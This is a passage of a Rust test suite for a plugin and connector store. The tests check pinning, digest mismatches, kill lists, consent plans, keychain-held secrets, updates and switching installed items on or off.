            ),
            link: "",
        },
        file(
            "o-r-abc/plugins/agent-sdk-dev/notes.txt",
            b"nothing a plugin holds",
        ),
    ]);
    let r = rig_with(
        github_world(sha, no_manifest),
        plugin_script(Arc::new(Mutex::new(1))),
    );
    r.store.refresh(Some("anthropic")).await.unwrap();
    assert_eq!(
        r.store
            .stage("anthropic:agent-sdk-dev", None)
            .await
            .unwrap_err()
            .code(),
        "hx.store.invalid_manifest"
    );
}

#[tokio::test]
async fn unpinned_removed_and_unsupported_items_are_refused_before_anything_is_fetched() {
    let r = rig_with(world(|_| None), quiet());
    r.store.refresh(None).await.unwrap();
    let before = r.net.seen.lock().unwrap().len();
    assert_eq!(
        r.store
            .stage("anthropic:xcode", None)
            .await
            .unwrap_err()
            .code(),
        "hx.store.unpinned",
        "a command source has no pin"
    );
    assert_eq!(
        r.store
            .stage("mcp-registry:ai.aliengiraffe/spotdb", None)
            .await
            .unwrap_err()
            .code(),
        "hx.store.unpinned",
        "an image tag is not a digest"
    );
    assert_eq!(
        r.store.stage("nope:x", None).await.unwrap_err().code(),
        "hx.store.not_found"
    );
    assert_eq!(
        r.store.stage("garbage", None).await.unwrap_err().code(),
        "hx.store.not_found"
    );
    assert_eq!(
        r.net.seen.lock().unwrap().len(),
        before,
        "no request was made"
    );
    // A removed item (the registry's deprecated one is flagged, not removed; remove one through the engine's kill list shape).
    let r2 = rig_with(
        world(|url| {
            url.starts_with(super::service::ENGINE_CATALOGUE_URL).then(|| {
                let mut doc: Value = serde_json::from_str(ENGINE).unwrap();
                doc["removed"] = json!([{"name": "0bull", "reason": "Folded into another plugin.", "date": "2026-09-28"}]);
                ok(doc.to_string())
            })
        }),
        quiet(),
    );
    r2.store.refresh(Some("engine-plugins")).await.unwrap();
    let e = r2
        .store
        .stage("engine-plugins:0bull", None)
        .await
        .unwrap_err();
    assert_eq!(e.code(), "hx.store.removed");
    assert!(e.to_string().contains("Folded into another plugin"));
    assert_eq!(r2.store.kill_list().len(), 1);
    assert_eq!(
        r2.store.kill_list()[0].1.by,
        super::types::RemovedBy::Engine
    );
}

// ---------------------------------------------------------------- connectors

fn secrets_of(pairs: &[(&str, &str)]) -> Option<BTreeMap<String, String>> {
    Some(
        pairs
            .iter()
            .map(|(k, v)| ((*k).to_owned(), (*v).to_owned()))
            .collect(),
    )
}

#[tokio::test]
async fn a_registry_connector_is_planned_installed_and_allowed_for_governed_exec_then_removed() {
    let r = rig_with(world(|_| None), quiet());
    r.store.refresh(Some("mcp-registry")).await.unwrap();
    let st = r
        .store
        .stage("mcp-registry:ai.2kw/mcp-server", None)
        .await
        .unwrap();
    assert!(
        st.tree_sha256.is_none() && st.files == 0,
        "nothing to download: the server starts from its registry on first use"
    );
    assert_eq!(st.scan.verdict, ScanVerdict::NotScanned);
    let plan = r.store.plan(&st.stage_id, None, None).await.unwrap();
    assert_eq!(
        (plan.kind, plan.layer, plan.tier),
        (ItemKind::Connector, Layer::Connector, Tier::NotReviewed)
    );
    assert_eq!(plan.code_runs[0].command, "npx -y @2kw/ai-mcp-server@8.0.3");
    assert_eq!(
        plan.code_runs[0].runs_where,
        super::types::CodeWhere::OutsideSandbox
    );
    assert_eq!(plan.hosts.basis, HostBasis::Unknown);
    assert_eq!(plan.secrets[0].id, "ai_2kw_api_key");
    assert_eq!(plan.secrets[0].env.as_deref(), Some("AI_2KW_API_KEY"));
    assert!(
        plan.warnings
            .iter()
            .any(|w| w.code == "unreviewed" && w.level == super::types::WarningLevel::Strong)
    );
    assert!(
        plan.consent
            .iter()
            .any(|c| c.id == "runs-server" && c.runs_code),
        "a card with code to run cannot be approved by a click"
    );
    assert!(
        plan.files_written
            .iter()
            .any(|f| f.path.contains("mcp_allowlist"))
    );
    assert_eq!(
        plan.governed.text,
        "In governed mode this server is reachable only through exec, and each call is decided by your permissions."
    );
    // Another hash is refused and nothing is added.
    let e = r
        .store
        .install(request(&st.stage_id, &"1".repeat(64)), None, false)
        .await
        .unwrap_err();
    assert_eq!(e.code(), "hx.store.plan_changed");
    assert!(r.mcp.0.lock().unwrap().servers.is_empty());
    // A missing required key is refused by the connector flow, with its own code.
    let e = r
        .store
        .install(request(&st.stage_id, &plan.plan_hash), None, false)
        .await
        .unwrap_err();
    assert_eq!(e.code(), "hx.connectors.secret_missing");
    let mut req = request(&st.stage_id, &plan.plan_hash);
    req.secrets = secrets_of(&[("ai_2kw_api_key", "key-0123456789-secret")]);
    req.restart = Some(super::types::RestartWhen::WhenIdle);
    let receipt = r.store.install(req, None, false).await.unwrap();
    assert_eq!(
        (receipt.layer, receipt.item_id.as_str()),
        (Layer::Connector, "mcp-registry:ai.2kw/mcp-server")
    );
    assert!(
        receipt.steps.iter().any(|s| s.name.contains("governed")),
        "{:?}",
        receipt.steps
    );
    {
        let m = r.mcp.0.lock().unwrap();
        let cfg = &m.servers["mcp-server"];
        assert_eq!(cfg["command"], "npx");
        assert_eq!(cfg["args"], json!(["-y", "@2kw/ai-mcp-server@8.0.3"]));
        assert!(
            cfg["env"]["AI_2KW_API_KEY"]
                .as_str()
                .unwrap()
                .starts_with("${BOOPIS_CONNECTOR_"),
            "only a reference reaches the engine"
        );
        assert_eq!(
            m.config[crate::connectors::GOVERNED_ALLOWLIST],
            r#"["mcp-server"]"#,
            "governed exec may call it"
        );
        assert!(!format!("{:?}", m.config).contains("key-0123456789-secret"));
    }
    use crate::secrets::SecretStore as _;
    assert_eq!(
        r.keys
            .get("boopis.connector.mcp-server", "ai_2kw_api_key")
            .unwrap()
            .as_deref(),
        Some("key-0123456789-secret"),
        "the key is in the keychain"
    );
    let listed = r.store.installed(None).await.unwrap();
    assert_eq!(listed.len(), 1);
    assert_eq!(
        r.store
            .install(request(&st.stage_id, &plan.plan_hash), None, false)
            .await
            .unwrap_err()
            .code(),
        "hx.store.stage_missing",
        "the stage is spent"
    );
    let again = r
        .store
        .stage("mcp-registry:ai.2kw/mcp-server", None)
        .await
        .unwrap();
    let plan2 = r.store.plan(&again.stage_id, None, None).await.unwrap();
    let mut req = request(&again.stage_id, &plan2.plan_hash);
    req.secrets = secrets_of(&[("ai_2kw_api_key", "key-0123456789-secret")]);
    assert_eq!(
        r.store.install(req, None, false).await.unwrap_err().code(),
        "hx.store.already_installed"
    );
    let gone = r
        .store
        .uninstall("mcp-registry:ai.2kw/mcp-server", false, None)
        .await
        .unwrap();
    assert_eq!(
        gone.kept_secrets.len(),
        1,
        "the keys stay unless the user says delete"
    );
    {
        let m = r.mcp.0.lock().unwrap();
        assert!(m.servers.is_empty());
        assert!(
            !m.config.contains_key(crate::connectors::GOVERNED_ALLOWLIST),
            "and it is off the governed list"
        );
    }
    assert!(r.store.installed(None).await.unwrap().is_empty());
    assert_eq!(
        r.store
            .uninstall("mcp-registry:ai.2kw/mcp-server", false, None)
            .await
            .unwrap_err()
            .code(),
        "hx.store.not_installed"
    );
}

#[tokio::test]
async fn boopis_own_connector_installs_through_the_collection() {
    let r = rig_with(world(|_| None), quiet());
    let st = r.store.stage("boopis:firecrawl", None).await.unwrap();
    let plan = r.store.plan(&st.stage_id, None, None).await.unwrap();
    assert_eq!(
        (plan.tier, plan.pinned.value.as_str()),
        (Tier::Recommended, "3.40.0")
    );
    assert!(!plan.warnings.iter().any(|w| w.code == "unreviewed"));
    assert_eq!(
        plan.code_runs[0].command, "npx -y firecrawl-mcp@3.40.0",
        "the way of running it that needs no setting the store cannot ask for"
    );
    let mut req = request(&st.stage_id, &plan.plan_hash);
    req.secrets = secrets_of(&[("firecrawl_api_key", "fc-0123456789-secret")]);
    req.restart = Some(super::types::RestartWhen::Now);
    r.store.install(req, None, false).await.unwrap();
    let m = r.mcp.0.lock().unwrap();
    assert!(m.servers.contains_key("firecrawl"));
    assert!(m.config[crate::connectors::GOVERNED_ALLOWLIST].contains("firecrawl"));
}

#[tokio::test]
async fn a_remote_registry_connector_says_it_cannot_be_pinned() {
    let r = rig_with(world(|_| None), quiet());
    r.store.refresh(Some("mcp-registry")).await.unwrap();
    let st = r
        .store
        .stage("mcp-registry:ac.inference.sh/mcp", None)
        .await
        .unwrap();
    let plan = r.store.plan(&st.stage_id, None, None).await.unwrap();
    assert!(plan.code_runs.is_empty());
    assert_eq!(plan.hosts.hosts, vec!["api.inference.sh".to_owned()]);
    assert!(plan.warnings.iter().any(|w| w.code == "not-pinned-remote"));
    assert!(plan.consent.iter().all(|c| !c.runs_code));
    let receipt = r
        .store
        .install(request(&st.stage_id, &plan.plan_hash), None, false)
        .await
        .unwrap();
    assert_eq!(receipt.restart_needed, Some(false));
    assert_eq!(
        r.mcp.0.lock().unwrap().servers["mcp"]["url"],
        "https://api.inference.sh/mcp"
    );
}

// ---------------------------------------------------------------- engine plugins

fn engine_script(
    inspect_sha: String,
    confirm_fails: bool,
) -> impl Fn(&str, &Value) -> Result<Value> + Send + Sync + 'static {
    move |m, p| match m {
        "plugins.manage" => match p["action"].as_str().unwrap() {
            "inspect" => Ok(
                json!({"ok": true, "agent": true, "desktop": false, "sha": inspect_sha, "warnings": []}),
            ),
            "install" => {
                Ok(json!({"ok": true, "name": p["catalog_name"], "sha": p["ref"], "enabled": true}))
            }
            "remove" => Ok(json!({"ok": true, "name": p["name"]})),
            other => panic!("unscripted action {other}"),
        },
        "plugin.boopis.store.prepare" => {
            assert_eq!(p["kind"], "engine-plugin");
            assert!(
                p.get("staged_dir").is_none(),
                "the engine fetches an engine plugin"
            );
            assert!(p["engine"]["capabilities"].is_object());
            Ok(plugin_plan("engine-plugin", &Value::Null, "eh-1"))
        }
        "plugin.boopis.store.confirm" => {
            if confirm_fails {
                return Err(Error::Store(
                    "hx.store.governed_refused",
                    "the project's switch is on".into(),
                ));
            }
            let pin: super::types::Pin = serde_json::from_value(p["pinned"].clone()).unwrap();
            assert_eq!(p["engine"]["name"], "0bull");
            Ok(
                json!({"receipt": receipt_json(p["item_id"].as_str().unwrap(), ItemKind::EnginePlugin, Layer::Engine, &pin, p["plan_hash"].as_str().unwrap())}),
            )
        }
        "session.active_list" => Ok(json!({"sessions": []})),
        "plugin.boopis.store.list" => Ok(json!({"items": [], "kill_listed": []})),
        "plugin.boopis.store.removed.set" => Ok(json!({"flagged": []})),
        _ => Err(Error::Store(
            "hx.store.install_failed",
            format!("unscripted {m}"),
        )),
    }
}

#[tokio::test]
async fn an_engine_plugin_is_installed_at_the_commit_the_engine_read_and_then_recorded() {
    let pin = "240890a71715375bc877b238491e414517e9d902".to_owned();
    let r = rig_with(world(|_| None), engine_script(pin.clone(), false));
    r.store.refresh(Some("engine-plugins")).await.unwrap();
    let st = r.store.stage("engine-plugins:0bull", None).await.unwrap();
    let plan = r.store.plan(&st.stage_id, None, None).await.unwrap();
    assert_eq!(
        (plan.kind, plan.layer, plan.tier),
        (ItemKind::EnginePlugin, Layer::Engine, Tier::NotReviewed)
    );
    assert_eq!(plan.warnings[0].code, "unreviewed");
    assert_eq!(plan.pinned.value, pin);
    let receipt = r
        .store
        .install(request(&st.stage_id, &plan.plan_hash), None, false)
        .await
        .unwrap();
    assert_eq!(receipt.layer, Layer::Engine);
    let install = &r
        .gw
        .called("plugins.manage")
        .into_iter()
        .find(|p| p["action"] == "install")
        .unwrap();
    assert_eq!(
        (
            install["ref"].as_str(),
            install["inspected_sha"].as_str(),
            install["catalog_name"].as_str()
        ),
        (Some(pin.as_str()), Some(pin.as_str()), Some("0bull"))
    );
    let order = r.gw.order();
    let pos = |m: &str| order.iter().position(|x| x == m).unwrap();
    let last_manage = order.iter().rposition(|x| x == "plugins.manage").unwrap();
    assert!(
        last_manage < pos("plugin.boopis.store.confirm"),
        "the engine installs first, then the plugin records it: {order:?}"
    );
}

#[tokio::test]
async fn the_engine_reading_another_commit_than_the_catalogue_pins_is_refused_at_stage() {
    let r = rig_with(world(|_| None), engine_script("f".repeat(40), false));
    r.store.refresh(Some("engine-plugins")).await.unwrap();
    assert_eq!(
        r.store
            .stage("engine-plugins:0bull", None)
            .await
            .unwrap_err()
            .code(),
        "hx.store.digest_mismatch"
    );
}

#[tokio::test]
async fn a_refused_record_takes_the_engine_plugin_out_again() {
    let r = rig_with(
        world(|_| None),
        engine_script("240890a71715375bc877b238491e414517e9d902".into(), true),
    );
    r.store.refresh(Some("engine-plugins")).await.unwrap();
    let st = r.store.stage("engine-plugins:0bull", None).await.unwrap();
    let plan = r.store.plan(&st.stage_id, None, None).await.unwrap();
    let e = r
        .store
        .install(request(&st.stage_id, &plan.plan_hash), None, false)
        .await
        .unwrap_err();
    assert_eq!(
        e.code(),
        "hx.store.governed_refused",
        "the plugin's own refusal keeps its code"
    );
    assert!(
        r.gw.called("plugins.manage")
            .iter()
            .any(|p| p["action"] == "remove" && p["name"] == "0bull"),
        "nothing was left installed"
    );
}

// ---------------------------------------------------------------- updates

#[tokio::test]
async fn updates_are_a_catalogue_diff_naming_what_widened_and_a_takedown_is_flagged() {
    let hub_old: super::types::Pin = super::types::Pin {
        kind: PinKind::Version,
        value: "0.0.1".into(),
        repo: Some("npm:firecrawl-mcp".into()),
    };
    let r = rig_with(world(|_| None), quiet());
    r.store.refresh(Some("mcp-registry")).await.unwrap();
    // Install the firecrawl connector, then pretend an older version was installed and a new host appeared since.
    let st = r.store.stage("boopis:firecrawl", None).await.unwrap();
    let plan = r.store.plan(&st.stage_id, None, None).await.unwrap();
    let mut req = request(&st.stage_id, &plan.plan_hash);
    req.secrets = secrets_of(&[("firecrawl_api_key", "fc-0123456789-secret")]);
    req.restart = Some(super::types::RestartWhen::Now);
    r.store.install(req, None, false).await.unwrap();
    assert!(
        r.store.update_check(None, None).await.unwrap().is_empty(),
        "same pin: nothing to update"
    );
    let mut all = r.store.cache.installed();
    all.items[0].receipt.pinned = hub_old.clone();
    all.items[0]
        .plan
        .hosts
        .hosts
        .retain(|h| h != "api.firecrawl.dev");
    r.store.cache.save_installed(&all).unwrap();
    let diffs = r.store.update_check(None, None).await.unwrap();
    assert_eq!(diffs.len(), 1);
    let d = &diffs[0];
    assert_eq!(
        (
            d.status,
            d.from.pinned.value.as_str(),
            d.to.as_ref().unwrap().pinned.value.as_str()
        ),
        (UpdateStatus::Available, "0.0.1", "3.40.0")
    );
    assert_eq!(d.new_hosts, vec!["api.firecrawl.dev".to_owned()]);
    assert!(
        d.widened,
        "a new host is called out and the whole card is needed again"
    );
    assert!(d.changes.iter().any(|c| c.name == "api.firecrawl.dev"));
    assert_eq!(
        r.store
            .update_check(Some("boopis:firecrawl".into()), None)
            .await
            .unwrap()
            .len(),
        1
    );
    assert_eq!(
        r.store
            .update_check(Some("boopis:nope".into()), None)
            .await
            .unwrap_err()
            .code(),
        "hx.store.not_installed"
    );
    // An update goes through the same flow: stage, plan, hold, then the old server is replaced.
    let st = r.store.stage("boopis:firecrawl", None).await.unwrap();
    let plan = r.store.plan(&st.stage_id, None, None).await.unwrap();
    let mut req = request(&st.stage_id, &plan.plan_hash);
    req.secrets = secrets_of(&[("firecrawl_api_key", "fc-0123456789-secret")]);
    req.restart = Some(super::types::RestartWhen::Now);
    let receipt = r.store.install(req, None, true).await.unwrap();
    assert_eq!(
        receipt.previous.as_ref().unwrap().pinned.value,
        "0.0.1",
        "the version before is kept one step back"
    );
    assert!(r.store.update_check(None, None).await.unwrap().is_empty());
}

#[tokio::test]
async fn an_installed_item_that_loses_its_pin_or_is_taken_down_is_reported() {
    let r = rig_with(world(|_| None), quiet());
    r.store.refresh(Some("mcp-registry")).await.unwrap();
    let st = r
        .store
        .stage("mcp-registry:ac.inference.sh/mcp", None)
        .await
        .unwrap();
    let plan = r.store.plan(&st.stage_id, None, None).await.unwrap();
    r.store
        .install(request(&st.stage_id, &plan.plan_hash), None, false)
        .await
        .unwrap();
    let net2 = world(|url| {
        url.starts_with("https://registry.modelcontextprotocol.io")
            .then(|| {
                let mut doc: Value = serde_json::from_str(REGISTRY).unwrap();
                for row in doc["servers"].as_array_mut().unwrap() {
                    if row["server"]["name"] == "ac.inference.sh/mcp" {
                        row["server"].as_object_mut().unwrap().remove("version");
                    }
                }
                ok(doc.to_string())
            })
    });
    // Same cache directory, a registry that now lists the server with no version: it lost its pin.
    let store2 = Store::new(
        &r.dir.path().join("store"),
        Limits::default(),
        net2,
        Arc::new(FakeHost {
            engine: Arc::new(Engine::new(
                r.mcp.clone(),
                r.keys.clone(),
                Arc::new(NoBrowser),
                Limits::default(),
            )),
            gateway: r.gw.clone(),
        }),
    )
    .unwrap();
    store2.refresh(Some("mcp-registry")).await.unwrap();
    let d = store2.update_check(None, None).await.unwrap();
    assert_eq!(d[0].status, UpdateStatus::Unpinned);
}

// ---------------------------------------------------------------- sources the user adds

#[tokio::test]
async fn a_folder_the_user_adds_lists_its_skills_pinned_by_their_hash_and_stages_only_if_unchanged()
{
    let r = rig_with(world(|_| None), plugin_script(Arc::new(Mutex::new(1))));
    let folder = r.dir.path().join("my-skills");
    std::fs::create_dir_all(folder.join("release-notes")).unwrap();
    std::fs::write(
        folder.join("release-notes/SKILL.md"),
        "---\nname: release-notes\ndescription: Writes release notes.\n---\nbody",
    )
    .unwrap();
    std::fs::create_dir_all(folder.join("broken")).unwrap();
    std::fs::write(folder.join("broken/SKILL.md"), "no front matter").unwrap();
    let src = r
        .store
        .source_add(
            None,
            Some(folder.to_string_lossy().into_owned()),
            Some("My skills".into()),
        )
        .await
        .unwrap();
    assert!(src.user_added && src.id.starts_with("added-") && src.label == "My skills");
    assert_eq!(src.kinds, vec![ItemKind::Skill]);
    let item = r
        .store
        .browse(
            None,
            &StoreFilter {
                source: Some(src.id.clone()),
                ..StoreFilter::default()
            },
            None,
            None,
        )
        .unwrap()
        .items
        .remove(0);
    assert_eq!(
        (item.tier, item.pinned.as_ref().unwrap().kind),
        (Tier::NotReviewed, PinKind::TreeSha256)
    );
    assert_eq!(
        r.store
            .source_add(None, Some(folder.to_string_lossy().into_owned()), None)
            .await
            .unwrap_err()
            .code(),
        "hx.store.invalid_source",
        "twice"
    );
    let st = r.store.stage(&item.id, None).await.unwrap();
    assert_eq!(
        st.tree_sha256.as_deref(),
        Some(item.pinned.as_ref().unwrap().value.as_str())
    );
    r.store.staging.remove(&st.stage_id);
    std::fs::write(
        folder.join("release-notes/SKILL.md"),
        "---\nname: release-notes\ndescription: Changed since.\n---\nbody",
    )
    .unwrap();
    assert_eq!(
        r.store.stage(&item.id, None).await.unwrap_err().code(),
        "hx.store.digest_mismatch",
        "the folder changed since it was added"
    );
    r.store.source_remove(&src.id).unwrap();
    assert!(r.store.find(&item.id).is_err());
    assert_eq!(r.store.sources().iter().filter(|s| s.user_added).count(), 0);
}

#[tokio::test]
async fn bad_sources_are_refused_in_words() {
    let r = rig_with(world(|_| None), quiet());
    for (u, p) in [
        (Some("http://example.com/m.json"), None),
        (Some("https://user:pw@example.com/m.json"), None),
        (None, Some("/no/such/path")),
        (None, None),
    ] {
        let e = r
            .store
            .source_add(u.map(str::to_owned), p.map(str::to_owned), None)
            .await
            .unwrap_err();
        assert!(
            e.code() == "hx.store.invalid_source" || e.code() == "hx.invalid_params",
            "{u:?} {p:?}: {}",
            e.code()
        );
    }
    let empty = r.dir.path().join("empty");
    std::fs::create_dir_all(&empty).unwrap();
    assert_eq!(
        r.store
            .source_add(None, Some(empty.to_string_lossy().into_owned()), None)
            .await
            .unwrap_err()
            .code(),
        "hx.store.invalid_manifest"
    );
}

#[tokio::test]
async fn a_github_address_is_read_through_the_refs_and_a_marketplace_file() {
    let sha = head();
    let r = rig_with(
        world(|url| {
            (url.contains("/acme/kit/") && url.ends_with("marketplace.json")).then(|| {
                ok(json!({"name": "acme-kit", "owner": {"name": "Acme"}, "plugins": [{"name": "lint", "description": "Lints.", "source": "./plugins/lint"}]}).to_string())
            })
        }),
        quiet(),
    );
    let src = r
        .store
        .source_add(Some("https://github.com/acme/kit".into()), None, None)
        .await
        .unwrap();
    assert_eq!(src.label, "acme/kit");
    let item = r.store.find(&format!("{}:lint", src.id)).unwrap().item;
    assert_eq!(
        (item.kind, item.tier),
        (ItemKind::Plugin, Tier::NotReviewed)
    );
    assert_eq!(
        item.pinned.unwrap().value,
        sha,
        "pinned at the commit the refs gave"
    );
    let urls = r.net.seen.lock().unwrap().clone();
    assert!(
        urls.iter().any(|u| u.contains("acme/kit.git/info/refs")),
        "the commit comes from the refs, not the API"
    );
    assert!(urls.iter().all(|u| !u.contains("api.github.com")));
}

// ---------------------------------------------------------------- switching an installed item on or off

#[tokio::test]
async fn a_connector_is_switched_through_the_connector_flow_and_the_host_record_follows() {
    let r = rig_with(world(|_| None), quiet());
    let st = r.store.stage("boopis:firecrawl", None).await.unwrap();
    let plan = r.store.plan(&st.stage_id, None, None).await.unwrap();
    let mut req = request(&st.stage_id, &plan.plan_hash);
    req.secrets = secrets_of(&[("firecrawl_api_key", "fc-0123456789-secret")]);
    r.store.install(req, None, false).await.unwrap();
    r.store
        .set_item_enabled("boopis:firecrawl", false, None)
        .await
        .unwrap();
    assert_eq!(
        r.mcp.0.lock().unwrap().switched,
        vec![("firecrawl".to_owned(), false)]
    );
    let listed = r.store.installed(None).await.unwrap();
    assert!(!listed[0].enabled, "the record says it is off");
    r.store
        .set_item_enabled("boopis:firecrawl", true, None)
        .await
        .unwrap();
    assert!(r.store.installed(None).await.unwrap()[0].enabled);
    assert_eq!(
        r.store
            .set_item_enabled("boopis:nothing", true, None)
            .await
            .unwrap_err()
            .code(),
        "hx.store.not_installed"
    );
}

#[tokio::test]
async fn a_plugin_item_is_switched_by_the_plugin_and_a_failure_comes_back_as_its_code() {
    let pin = super::types::Pin {
        kind: PinKind::Commit,
        value: "e5".repeat(20),
        repo: None,
    };
    let item = receipt_json(
        "anthropic:lint-kit",
        ItemKind::Plugin,
        Layer::Plugin,
        &pin,
        "h",
    );
    let listed = item.clone();
    let r = rig_with(world(|_| None), move |m, p| match m {
        "plugin.boopis.store.list" => Ok(json!({"items": [listed.clone()], "kill_listed": []})),
        "plugin.boopis.store.set_enabled" if p["enabled"] == true => {
            Err(Error::Store("hx.store.removed", "it was taken down".into()))
        }
        "plugin.boopis.store.set_enabled" => Ok(json!({"receipt": null})),
        other => quiet()(other, p),
    });
    r.store
        .set_item_enabled("anthropic:lint-kit", false, None)
        .await
        .unwrap();
    let sent = &r.gw.called("plugin.boopis.store.set_enabled")[0];
    assert_eq!(
        (
            sent["item_id"].as_str(),
            sent["kind"].as_str(),
            sent["enabled"].as_bool()
        ),
        (Some("anthropic:lint-kit"), Some("plugin"), Some(false))
    );
    assert_eq!(
        r.store
            .set_item_enabled("anthropic:lint-kit", true, None)
            .await
            .unwrap_err()
            .code(),
        "hx.store.removed"
    );
}

#[tokio::test]
async fn an_engine_plugin_is_switched_through_the_same_plugin_record() {
    let pin = super::types::Pin {
        kind: PinKind::Commit,
        value: "e5".repeat(20),
        repo: None,
    };
    let item = receipt_json(
        "engine-plugins:0bull",
        ItemKind::EnginePlugin,
        Layer::Engine,
        &pin,
        "h",
    );
    let r = rig_with(world(|_| None), move |m, p| match m {
        "plugin.boopis.store.list" => Ok(json!({"items": [item.clone()], "kill_listed": []})),
        "plugin.boopis.store.set_enabled" => Ok(json!({"receipt": null})),
        other => quiet()(other, p),
    });
    r.store
        .set_item_enabled("engine-plugins:0bull", false, None)
        .await
        .unwrap();
    assert_eq!(
        r.gw.called("plugin.boopis.store.set_enabled")[0]["kind"],
        "engine-plugin"
    );
}
